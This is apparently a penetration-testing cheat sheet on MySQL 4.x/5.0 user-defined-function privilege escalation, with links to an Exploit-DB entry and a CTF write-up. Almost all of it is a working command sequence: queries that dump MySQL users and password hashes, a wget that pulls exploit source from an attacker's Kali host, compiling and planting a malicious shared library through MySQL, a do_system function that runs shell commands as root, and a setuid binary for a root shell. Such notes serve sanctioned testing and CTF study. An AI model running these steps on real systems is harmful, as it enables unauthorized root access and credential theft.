# Privilege Escalation -  MySQL 4.x/5.0

* [MySQL 4.x/5.0 - User-Defined Function (UDF) Local Privilege Escalation Exploit (Linux)](https://www.exploit-db.com/exploits/1518/)
* [https://wg135.github.io/blog/2016/08/12/lord-the-root/](https://wg135.github.io/blog/2016/08/12/lord-the-root/)

### Local Enumeration

```bash
# Check the version of MySQL
LinEnum.sh

# Check if MySQL is run by root
ps augxw | grep root | grep mysql

# Get current user (an all users) privileges and hashes
mysql> use mysql;
mysql> select user();
mysql> select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user;

# google vulnerability
MySQL, 5.0.xx privilege escalation
```

### Escalation

```bash
# Get a source code, and then compile it on the target machine
wget http://<Kali IP>/1518.c
mv 1518.c  raptor_udf2.c
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

mysql -u root -p
Enter password:

mysql> use mysql;

mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/home/j0hn/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select * from mysql.func;
mysql> select do_system('id > /tmp/out; chown j0hn.j0hn /tmp/out');
mysql> \! sh
cat /tmp/out

wget https://github.com/wg135/script/blob/master/suid.c /tmp
exit

mysql> select do_system('gcc -o /tmp/suid /tmp/suid.c');
mysql> select do_system('chmod u+s /tmp/suid');
mysql> \! sh
bash$ ./suid
```
